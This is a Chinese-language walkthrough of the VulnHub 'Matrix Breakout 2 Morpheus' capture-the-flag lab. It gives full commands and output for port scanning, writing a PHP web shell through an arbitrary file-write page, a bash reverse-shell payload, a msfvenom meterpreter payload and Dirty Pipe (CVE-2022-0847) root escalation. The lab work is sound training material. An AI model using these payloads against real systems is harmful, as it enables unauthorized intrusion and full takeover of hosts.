
#渗透 #vulnhub #kali #工具使用 #漏洞利用 #自定义工具 #msf
# 一、介绍
vulnhub上一个以《黑客帝国》为背景的靶场

涉及内容

 - 主机发现
 - 端口服务扫描
 - 1.2不用工具实现
 - ffuf目录爆破
 -  一句话木马
 -  反弹shell msf，蚁剑使用
 - 图片隐写
 - CVE-2022-0847漏洞利用

# 二、环境

 - 攻击机：kali
 - 靶机：matrix-breakout-2-morpheus

# 三、过程
## 1、信息收集
### 1.1主机存活扫描
**nmap扫描**

```powershell
┌──(root㉿kali)-[~]
└─# nmap -sn 192.168.124.0/24
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-27 06:50 EDT
Nmap scan report for 192.168.124.1
Host is up (0.00021s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.124.2
Host is up (0.00027s latency).
MAC Address: 00:50:56:E2:53:85 (VMware)
Nmap scan report for 192.168.124.132
Host is up (0.00012s latency).
MAC Address: 00:0C:29:09:6C:9D (VMware)
Nmap scan report for 192.168.124.254
Host is up (0.00013s latency).
MAC Address: 00:50:56:E6:63:42 (VMware)
Nmap scan report for 192.168.124.129
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 14.06 seconds

```
发现目标：192.168.124.132

**ping命令扫描**
#自定义工具 
编写以下命令扫描
`for i in {1..254};do ping -c 1 -w 1 192.168.124.$i|grep from;done`

```powershell
┌──(root㉿kali)-[~]
└─# for i in {1..254};do ping -c 1 -w 1 192.168.124.$i|grep from;done
64 bytes from 192.168.124.2: icmp_seq=1 ttl=128 time=0.155 ms
64 bytes from 192.168.124.129: icmp_seq=1 ttl=64 time=0.026 ms
64 bytes from 192.168.124.132: icmp_seq=1 ttl=64 time=1.21 ms
                                                                  
```
### 1.2信息扫描
#### 端口扫描
**使用nmap**
`nmap --min-rate 10000 -p- 192.168.124.132`

```powershell
┌──(root㉿kali)-[~]
└─# nmap --min-rate=10000 -p- 192.168.124.132
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-27 06:57 EDT
Nmap scan report for 192.168.124.132
Host is up (0.00015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
81/tcp open  hosts2-ns
MAC Address: 00:0C:29:09:6C:9D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds

```
发现开启22、80、81端口

#自定义工具 
 **使用伪设备进行端口扫描**
需要先调用bash
`for i in {1..80};do (echo < /dev/tcp/192.168.124.132/$i) &>/dev/null && printf "\n[+] The Open Port is:%d\n" "$i" || printf "." ;done
`
```powershell
┌──(root㉿kali)-[~]
└─# for i in {1..65535};do (echo < /dev/tcp/192.168.124.132/$i) &>/dev/null && printf "\n[+] The Open Port is:%d\n" "$i" || printf "." ;done
.....................
[+] The Open Port is:22
.........................................................
[+] The Open Port is:80

[+] The Open Port is:81
.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
```

#### 服务信息扫描
`nmap -sV -sT -O -p22,90,81    192.168.124.132`

```powershell
┌──(root㉿kali)-[~]
└─# nmap -sV -sT -O -p22,80,81 192.168.124.132
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-27 06:59 EDT
Nmap scan report for 192.168.124.132
Host is up (0.00045s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
81/tcp open  http    nginx 1.18.0
MAC Address: 00:0C:29:09:6C:9D (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 - 5.3 (99%), Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 4.15 - 5.6 (96%), Linux 5.3 - 5.4 (96%), Sony X75CH-series Android TV (Android 5.0) (95%), Linux 3.1 (95%), Linux 3.2 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.26 seconds
                                                                
```
发现22为ssh,80为apache,81为nginx
#### 漏洞扫描
`nmap --script=vuln -p22,80,81 192.168.124.132`

```powershell
┌──(root㉿kali)-[~]
└─# nmap --script=vuln -p22,80,81 192.168.124.132
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-27 07:01 EDT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.124.132
Host is up (0.00036s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /test.php: Test page
|_  /robots.txt: Robots file
81/tcp open  hosts2-ns
MAC Address: 00:0C:29:09:6C:9D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 57.17 seconds

```
80端口发现两个重要文件test.php和robots.txt
### 1.3目录爆破
`dirsearch -u http://192.168.124.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

使用ffuf进行 #目录爆破

```powershell
ffuf -u http://192.168.124.132/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c -ic -e .txt,.zip,.php,html
```
扫描结果

```powershell
┌──(root㉿kali)-[~]
└─# ffuf -u http://192.168.124.132/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c -ic -e .txt,.zip,.php,html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.124.132/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Extensions       : .txt .zip .php html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.php                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 5ms]
javascript              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 1ms]
robots.txt              [Status: 200, Size: 47, Words: 8, Lines: 2, Duration: 2ms]
graffiti.txt            [Status: 200, Size: 147, Words: 25, Lines: 7, Duration: 28ms]
graffiti.php            [Status: 200, Size: 469, Words: 36, Lines: 29, Duration: 57ms]
.php                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 12ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 8ms]
:: Progress: [1102735/1102735] :: Job [1/1] :: 6055 req/sec :: Duration: [0:02:13] :: Errors: 0 ::

```
发现存在robot.txt、graffiti.txt和graffiti.php三个敏感文件
## 2、网站预览
首页

![在这里插入图片描述](https://img-blog.csdnimg.cn/7de135ecea04442f8a76a3e1889bc0b8.png#pic_center)

访问robot.txt
`There's no white rabbit here.  Keep searching!`就一个这玩意
访问graffiti.php
![在这里插入图片描述](https://img-blog.csdnimg.cn/cb02102d8f454bb39d6d5b96695e73f6.png#pic_center)

发现可以输入的东西可以写入graffiti.txt

访问graffiti.txt
![在这里插入图片描述](https://img-blog.csdnimg.cn/4d7841836ccb4be48d5bf302077040a4.png#pic_center)
## 3、获得shell
以下可以有好几种方法
### 方案一 
#### 01一句话木马
抓取post包

```powershell
POST /graffiti.php HTTP/1.1

Host: 192.168.124.132

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 29

Origin: http://192.168.124.132

Connection: close

Referer: http://192.168.124.132/graffiti.php

Upgrade-Insecure-Requests: 1


//message=cmd&file=graffiti.txt//原始内容
message=<?php eval($_POST['CMD']);?>&file=test.php
```
用蚁剑连一下就行了
![在这里插入图片描述](https://img-blog.csdnimg.cn/da8d052356c44e6db1922dcd9ec08574.png#pic_center)
#### 02msf马+提权
生成 #msf 马

```powershell
　┌──(root㉿kali)-[~]
└─# msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.124.129 lport=4444 -f elf -o shell.elf                                                 
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
Saved as: shell.elf
```
利用蚁剑上传到靶机，加权
![在这里插入图片描述](https://img-blog.csdnimg.cn/16c02b6b4a774151b90ba95854da5e40.png#pic_center)

建立监听

```powershell
msfconsole

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp 
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set lhost 192.168.124.132
lhost => 192.168.124.132
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.124.132  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[-] Handler failed to bind to 192.168.124.132:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] Sending stage (989032 bytes) to 192.168.124.132
[*] Meterpreter session 1 opened (192.168.124.129:4444 -> 192.168.124.132:36648 ) at 2023-04-27 08:39:26 -0400

meterpreter > 
meterpreter > getuid
Server username: www-data
meterpreter > 


```
使用 #提权 模块post/multi/recon/local_exploit_suggester  

```powershell
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                   Information                 Connection
  --  ----  ----                   -----------                 ----------
  1         meterpreter x86/linux  www-data @ 192.168.124.132  192.168.124.129:4444 -> 192.168.124.132:36648  (192.168.124.132)

msf6 exploit(multi/handler) > search suggeste

Matching Modules
================

   #  Name                                             Disclosure Date  Rank    Check  Description
   -  ----                                             ---------------  ----    -----  -----------
   0  auxiliary/server/icmp_exfil                                       normal  No     ICMP Exfiltration Service
   1  exploit/windows/browser/ms10_018_ie_behaviors    2010-03-09       good    No     MS10-018 Microsoft Internet Explorer DHTML Behaviors Use After Free
   2  post/multi/recon/local_exploit_suggester                          normal  No     Multi Recon Local Exploit Suggester
   3  exploit/windows/smb/timbuktu_plughntcommand_bof  2009-06-25       great   No     Timbuktu PlughNTCommand Named Pipe Buffer Overflow


Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/smb/timbuktu_plughntcommand_bof

msf6 exploit(multi/handler) > use 2
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 192.168.124.132 - Collecting local exploits for x86/linux...
[*] 192.168.124.132 - 40 exploit checks are being tried...
[+] 192.168.124.132 - exploit/linux/local/cve_2022_0847_dirtypipe: The target appears to be vulnerable. Linux kernel version found: 5.10.0
[+] 192.168.124.132 - exploit/linux/local/su_login: The target appears to be vulnerable.
[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) > 
```
发现存在CVE-2022-0847漏洞
```powershell
//查询并使用漏洞
msf6 post(multi/recon/local_exploit_suggester) > search 2022_0847

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/linux/local/cve_2022_0847_dirtypipe  2022-02-20       excellent  Yes    Dirty Pipe Local Privilege Escalation via CVE-2022-0847


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/local/cve_2022_0847_dirtypipe

msf6 post(multi/recon/local_exploit_suggester) > use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > options

Module options (exploit/linux/local/cve_2022_0847_dirtypipe):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   COMPILE           Auto             yes       Compile on target (Accepted: Auto, True, False)
   SESSION                            yes       The session to run this module on
   SUID_BINARY_PATH  /bin/passwd      no        The path to a suid binary
   WRITABLE_DIR      /tmp             yes       A directory where we can write files


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

//监听端口换成5555，避免冲突
msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > set lport 5555
lport => 5555
msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > set lhost 192.168.124.129
lhost => 192.168.124.129
msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > run

[-] Msf::OptionValidateError The following options failed to validate: SESSION
msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > options

Module options (exploit/linux/local/cve_2022_0847_dirtypipe):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   COMPILE           Auto             yes       Compile on target (Accepted: Auto, True, False)
   SESSION                            yes       The session to run this module on
   SUID_BINARY_PATH  /bin/passwd      no        The path to a suid binary
   WRITABLE_DIR      /tmp             yes       A directory where we can write files


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.124.129  yes       The listen address (an interface may be specified)
   LPORT  5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > set session 1
session => 1
msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > run

[*] Started reverse TCP handler on 192.168.124.129:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Linux kernel version found: 5.10.0
[*] Executing exploit '/tmp/.vtpstmsxw /bin/passwd'
[*] Sending stage (3020772 bytes) to 192.168.124.132
[+] Deleted /tmp/.vtpstmsxw
[*] Meterpreter session 2 opened (192.168.124.129:5555 -> 192.168.124.132:56896 ) at 2023-04-27 08:49:48 -0400

meterpreter > whoami
[-] Unknown command: whoami
meterpreter > getuid
Server username: root
```
提权成功，这种方法虽然快，但是显得太简单
### 方案二
#### 03反弹shell并建立监听
使用nc建立监听`nc -lnvp 4444`

```powershell
┌──(root㉿kali)-[~]
└─# nc -lvnp 4444                                
listening on [any] 4444 ...
connect to [192.168.124.129] from (UNKNOWN) [192.168.124.132] 36940
bash: cannot set terminal process group (910): Inappropriate ioctl for device
bash: no job control in this shell
www-data@morpheus:/var/www/html$ 

```

使用php #反弹shell`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.124.129/4444 0>&1'"); ?>并进行url关键字编码
`


**数据包修改**

```powershell
POST /graffiti.php HTTP/1.1

Host: 192.168.124.132

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 111

Origin: http://192.168.124.132

Connection: close

Referer: http://192.168.124.132/graffiti.php

Upgrade-Insecure-Requests: 1



message=<%3fphp+exec("/bin/bash+-c+'bash+-i+>%26+/dev/tcp/192.168.124.129/4444+0>%261'")%3b+%3f>&file=shell.php
```

#### 04漏洞检测并提权
上传 #漏洞扫描脚本
**PEASS-ng脚本**
[PEASS-ng](https://github.com/carlospolop/PEASS-ng)这是个很牛逼的工具，使用它的linpeas_base.sh进行漏洞扫描
上传

```powershell
┌──(root㉿kali)-[~/…/update/PEASS-ng/linPEAS/builder]
└─# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.124.132 - - [27/Apr/2023 09:24:01] "GET /linpeas_base.sh HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.

```
下载加权使用，奇怪的是今天用这个脚本没扫描出来漏洞

```powershell
www-data@morpheus:/var/www/html$ wget http://192.168.124.129:8000/linpeas_base.sh
www-data@morpheus:chmod +x linpeas_base.sh
www-data@morpheus:./linpease_base.sh
```

#漏洞扫描脚本
**linux-exploit-suggester脚本**
上传加权与上面类似，不做重复演示
执行结果

```powershell
+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops

   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
   Exposure: probable
   Tags: ubuntu=20.04{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ubuntu=21.04{kernel:5.11.0-16-*}
   Download URL: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: ubuntu=(20.04|21.04),[ debian=11 ]
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
```
检测到一个cve-2022-0847漏洞

#提权
使用CVE-2022-0847 DirtyPipe漏洞
使用这一个脚本[github](https://github.com/r1is/CVE-2022-0847)

```powershell
www-data@morpheus:/var/www/html$ ./Dirty-Pipe.sh
./Dirty-Pipe.sh
/etc/passwd已备份到/tmp/passwd
It worked!
# 恢复原来的密码
rm -rf /etc/passwd
mv /tmp/passwd /etc/passwd
whoami 
root
```
#提高交互性

```powershell
python3 -c "import pty;pty.spawn('/bin/bash')"
root@morpheus:/var/www/html# ls
ls
Dirty-Pipe.sh  graffiti.txt       linux-exploit-suggester.sh  test02.elf
compile.sh     index.html         robots.txt                  trinity.jpeg
exp            index.html.1       shell.elf
exp.c          linpeas_base.sh    shell.php
graffiti.php   linpeas_base02.sh  test.php
root@morpheus:/var/www/html# whoami
whoami
root
root@morpheus:/var/www/html# 

```
发现还存在两个用户

```powershell
root@morpheus:/var/www/html# cd /home   
cd /home
root@morpheus:/home# ls
ls
cypher  trinity
root@morpheus:/home# 

```

## 4、获得flag
在根目录发现一个FALG.txt文件，打开如下

```powershell
root@morpheus:/# cat FLAG.txt
cat FLAG.txt
Flag 1!

You've gotten onto the system.  Now why has Cypher locked everyone out of it?

Can you find a way to get Cypher's password? It seems like he gave it to 
Agent Smith, so Smith could figure out where to meet him.

Also, pull this image from the webserver on port 80 to get a flag.

/.cypher-neo.png

```
提示存在一个隐藏文件在html目录下

```powershell
root@morpheus:/var/www/html# ls -alh
ls -alh
total 800K
drwxr-xr-x 2 www-data www-data 4.0K Apr 30 08:34 .
drwxr-xr-x 3 root     root     4.0K Oct 28  2021 ..
-rw-r--r-- 1 www-data www-data 373K Oct 28  2021 .cypher-neo.png
-rwxr-xr-x 1 www-data www-data 4.8K Apr 30 08:33 Dirty-Pipe.sh
-rw-r--r-- 1 www-data www-data   79 Apr 30 08:01 cmd.php
-rwxr-xr-x 1 www-data www-data  18K Apr 30 08:34 exp
-rw-r--r-- 1 www-data www-data 4.3K Apr 30 08:34 exp.c
-rw-r--r-- 1 www-data www-data  770 Oct 28  2021 graffiti.php
-rw-r--r-- 1 www-data www-data  143 Apr 30 07:59 graffiti.txt
-rw-r--r-- 1 www-data www-data  348 Oct 28  2021 index.html
-rwxr-xr-x 1 www-data www-data 315K Apr 30 08:05 linpeas_base.sh
-rw-r--r-- 1 www-data www-data   47 Oct 28  2021 robots.txt
-rw-r--r-- 1 www-data www-data  44K Oct 28  2021 trinity.jpeg

```
下载下来保存为neo.png
![在这里插入图片描述](https://img-blog.csdnimg.cn/02defa11c70144e1ba2d59c1a3b27b32.png#pic_center)
检查文件

```powershell
┌──(root㉿kali)-[~/tools/images]
└─# binwalk neo.png                         

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 853 x 480, 8-bit/color RGBA, non-interlaced
138           0x8A            Zlib compressed data, best compression

```
发现存在一个捆绑文件

```powershell
┌──(root㉿kali)-[~/tools/images/_neo.png.extracted]
└─# binwalk -e neo.png --run-as=root
┌──(root㉿kali)-[~/tools/images]
└─# ls
neo.png  _neo.png.extracted
                                                                                                                                                       
┌──(root㉿kali)-[~/tools/images]
└─# cd _neo.png.extracted        
                                                                                                                                                       
┌──(root㉿kali)-[~/tools/images/_neo.png.extracted]
└─# ls
8A  8A.zlib
```
存在 #图片隐写 ，使用winhxd查看
![在这里插入图片描述](https://img-blog.csdnimg.cn/71256f4050bb437fae43b0ce6baf74fa.png#pic_center)
末尾为AE 42 60 82大概率是个png文件，到这就不会了

# 四、一些问题

 - [ ] 隐写图片，有一个图片捆绑了一个zib文件。像一个png文件，不过怎么恢复
 - [ ] 81端口，不知道怎么利用
 - [ ] 第一个脚本没有发现漏洞
 - [ ] 蚁剑和msf连接，如何连接
>引用资料
>红队笔记https://www.bilibili.com/video/BV1dg411b74a/?spm_id_from=333.999.0.0


